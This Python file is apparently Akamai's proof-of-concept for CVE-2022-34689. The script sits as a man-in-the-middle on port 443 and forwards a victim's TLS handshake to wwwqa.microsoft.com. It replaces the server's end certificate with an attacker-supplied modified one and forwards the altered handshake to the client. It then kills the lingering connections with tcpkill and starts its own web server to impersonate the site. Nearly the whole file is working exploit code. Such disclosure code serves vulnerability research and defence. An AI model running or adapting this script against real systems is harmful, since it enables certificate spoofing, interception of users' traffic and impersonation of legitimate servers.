# mitm_script.py:
# MITM proxy for the TLS handshake of a "real" TLS server, modifying its end certificate.
# The connection is terminated after the client responds to the "Server Hello Done" message.

 # CVE-2022-34689 PoC code
 # Copyright 2023 Akamai Technologies, Inc.
 #
 # Licensed under the Apache License, Version 2.0 (the
 # "License"); you may not use this file except in
 # compliance with the License.  You may obtain a copy
 # of the License at
 #
 #   https://www.apache.org/licenses/LICENSE-2.0
 #
 # Unless required by applicable law or agreed to in
 # writing, software distributed under the License is
 # distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
 # CONDITIONS OF ANY KIND, either express or implied.
 # See the License for the specific language governing
 # permissions and limitations under the License.
 #
import socket
import struct
import subprocess
import sys
import time

LEGIT_ADDR = "wwwqa.microsoft.com"
LEGIT_PORT = 443
LISTEN_PORT = 443

TYPE_CLIENT_HELLO = 0x01
TYPE_SERVER_HELLO = 0x02
TYPE_SERVER_CERT = 0x0b
TYPE_SERVER_KEY_EXCHANGE = 0x0c
TYPE_SERVER_HELLO_DONE = 0x0e
TYPE_SERVER_CERT_STATUS = 0x16

DEBUG = True


# Receive exactly <size> bytes from socket <sock>
def recv_exactly(sock, size):
    result = b''

    while len(result) < size:
        buf = sock.recv(size - len(result))
        if not buf:
            raise RuntimeError('Connection closed')
        result += buf

    return result


# Receive a TLS 1.2 message on a connection, and verify its message type.
# This function receives only "handshake records".
# See also: https://tls12.xargs.org/
def tls_receive_message_and_verify_type(sock, msg_type, optional_msg_type=None):
    # Get record header
    msg = recv_exactly(sock, 5)
    
    # If "Change Cipher Spec" comes too early, it's probably a TLS 1.3 server which we don't currently support
    if msg[0] == 0x14:
        raise RuntimeError("Server is TLS 1.3, we don't support it")

    # Expect only "Handshake Record" because we terminate before other records are sent
    if msg[0] != 0x16:
        raise RuntimeError(f"Bad record type, expected 0x16, got 0x{msg[0]:x}")

    # Get message length
    (msg_len, ) = struct.unpack_from('>H', msg, 3)

    if DEBUG:
        print(f'[D] Receiving message of length {msg_len}')

    # Get message data
    msg += recv_exactly(sock, msg_len)

    # Ensure message type
    if msg[5] != msg_type and (optional_msg_type is None or msg[5] != optional_msg_type):
        raise RuntimeError(f"Bad message type, expected 0x{msg_type:x}, got 0x{msg[5]:x}")

    return msg


def modify_cert(server_certs, modified_cert):
    # server_certs is the complete "Server Certificate" TLS handshake message that came from the server.
    # It includes record headers, and then the actual DER-encoded certificates.
    # See also: https://tls12.xargs.org/#server-certificate

    # This function replaces the end-certificate (the first in the list) with our modified_cert,
    # and returns the modified message, formatted once again as a complete "Server Certificates" TLS handshake message.

    # First, ensure the "handshake header" length is OK (we assume the length fits in 2 bytes and doesn't need 3)
    assert server_certs[6] == 0
    assert struct.unpack_from(">H", server_certs, 7)[0] == len(server_certs) - 9

    # Next, ensure the "certificates length" is OK
    assert server_certs[9] == 0
    assert struct.unpack_from(">H", server_certs, 10)[0] == len(server_certs) - 12

    # Now we're ready to read certificates. We just read them one by one into an array.
    pos = 12
    len_remaining = len(server_certs) - 12

    certs = []

    # As long as certificates remain, we can read at least 3 bytes (the length of the next cert)
    while len_remaining >= 3:
        # Read the cert len (assume it fits in 2 bytes and doesn't need 3)
        assert server_certs[pos] == 0
        (cert_len, ) = struct.unpack_from(">H", server_certs, pos+1)
        assert cert_len <= len_remaining - 3

        print(f"[+] Found certificate #{len(certs) + 1}, length {cert_len}")

        # Read the cert by its length
        pos += 3
        certs.append(server_certs[pos:pos+cert_len])
        pos += cert_len
        len_remaining -= 3
        len_remaining -= cert_len

    # Make sure we reached the end of the message
    assert len_remaining == 0

    # The end-cert must appear first. This is the cert we replace.
    print('[+] Replacing cert')
    certs[0] = modified_cert

    # Now build a TLS "Server Certificates" handshake message
    print('[+] Reconstructing server certificates')

    # Append the certificates one by one with a length for each one
    res = b''
    for cert in certs:
        res += b'\x00' + struct.pack(">H", len(cert))
        res += cert

    # Prepend "certificates length" field, then prepend handshake header, then prepend record header
    res = b'\x00' + struct.pack(">H", len(res)) + res
    res = b'\x0b\x00' + struct.pack(">H", len(res)) + res
    res = server_certs[:3] + struct.pack(">H", len(res)) + res

    return res


def main():
    listen_addr = "192.168.0.180"

    if len(sys.argv) < 2:
        print('Usage: mitm_script.py [path_to_modified_cert] [optional: interface_name] [optional: listening_address]')
        return

    if len(sys.argv) >= 4:
        interface = sys.argv[2]
        listen_addr = str(sys.argv[3])

    elif len(sys.argv) == 3:
        interface = sys.argv[2]
    else:
        interface = "ens33"

    with open(sys.argv[1], 'rb') as modified_cert_file:
        modified_cert = modified_cert_file.read()

    if DEBUG:
        print(f'[+] Chosen interface: {listen_addr}')
        print(f'[+] Certificate path: {sys.argv[1]}')
        print(f'[+] Chosen interface: {interface}')


    server = socket.socket()
    server.bind((listen_addr, LISTEN_PORT))
    server.listen()
    print(f'[+] Listening on {listen_addr}:{LISTEN_PORT}')
    client, (client_addr, client_port) = server.accept()

    print(f'[+] Got connection from {client_addr}:{client_port}')

    client_hello = tls_receive_message_and_verify_type(client, TYPE_CLIENT_HELLO)

    print(f'[+] Received client hello')
    print(f'[+] Connecting to {LEGIT_ADDR}:{LEGIT_PORT}')

    legit = socket.socket()
    legit.connect((LEGIT_ADDR, LEGIT_PORT))

    print(f'[+] Sending client hello')
    legit.sendall(client_hello)

    print(f'[+] Receiving server hello')
    server_hello = tls_receive_message_and_verify_type(legit, TYPE_SERVER_HELLO)

    print(f'[+] Receiving server certificates')
    server_certs = tls_receive_message_and_verify_type(legit, TYPE_SERVER_CERT)

    print(f'[+] Modifying server certificates')
    modified_server_certs = modify_cert(server_certs, modified_cert)

    print(f'[+] Receiving server key exchange / optional certificate status')
    msg = tls_receive_message_and_verify_type(legit, TYPE_SERVER_KEY_EXCHANGE, TYPE_SERVER_CERT_STATUS)
    if msg[5] == TYPE_SERVER_KEY_EXCHANGE:
        cert_status = b''
        server_key_exchange = msg
    else:
        cert_status = msg
        print(f'[+] Got certificate status, receiving server key exchange')
        server_key_exchange = tls_receive_message_and_verify_type(legit, TYPE_SERVER_KEY_EXCHANGE)

    print(f'[+] Receiving server hello done')
    server_hello_done = tls_receive_message_and_verify_type(legit, TYPE_SERVER_HELLO_DONE)

    print(f'[+] Proxying everything back to client')
    client.sendall(server_hello + modified_server_certs + cert_status + server_key_exchange + server_hello_done)

    print(f'[+] Waiting for client response')
    client.recv(4096)

    print(f'[+] Killing sockets')
    server.close()
    legit.close()
    client.close()

    print(f'[+] Killing lingering TCP connections')
    subprocess.Popen(["tcpkill", "-i", interface, "port", "443"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    subprocess.run(["pkill", "tcpkill"])
    
    print(f'[+] Running own server')
    subprocess.run(["python3", "serve_website.py"])

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f'[E] {str(e)}')
